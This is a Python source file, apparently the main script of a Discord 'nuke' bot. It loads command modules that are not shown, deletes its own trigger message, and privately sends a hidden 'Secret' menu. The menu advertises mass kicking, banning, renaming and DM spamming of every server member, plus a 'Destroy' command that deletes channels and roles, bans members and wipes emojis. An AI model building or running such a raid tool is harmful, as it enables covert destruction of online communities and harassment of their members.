import discord, asyncio, json, os
from discord.ext import commands
from discord.ext.commands import bot

with open('./config.json') as f:
    config = json.load(f)

PREFIX = config.get('PREFIX')
API_TOKEN = config.get('API_TOKEN')
intents = discord.Intents(messages=True, guilds=True, members=True)
bot = commands.Bot(command_prefix=PREFIX, intents=intents, case_insensitive=True)
bot.remove_command("help")

for filename in os.listdir('./cogs'):
    if filename.endswith(".py"):
        try:
            bot.load_extension(f"cogs.{filename[:-3]}")
            print(f"Success to load {filename}")
        except Exception as e:
            print(f"Failed to load {filename}")
            print(f"[ERROR] {e}")

@bot.event
async def on_ready():
    print("Bot is Ready!!")
    print(f"Use {PREFIX}help for commands.")

@bot.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

#HELP COMMAND
@bot.command(pass_context=True)
async def help(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    embed = discord.Embed(colour=discord.Colour.blue())
    embed.set_author(name='Secret')
    embed.add_field(name='Kick', value='Kicks every member in a server', inline=False)
    embed.add_field(name='Ban', value='Bans every member in a server', inline=False)
    embed.add_field(name='Rename', value='Renames every member in a server', inline=False)
    embed.add_field(name='Dm', value='Messages every member in a server', inline=False)
    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
    embed.add_field(name='Ping', value='Gives ping to bot (expressed in MS)', inline=False)
    embed.add_field(name='Info', value='Gives information of a user', inline=False)
    await member.send(embed=embed)

bot.run(API_TOKEN)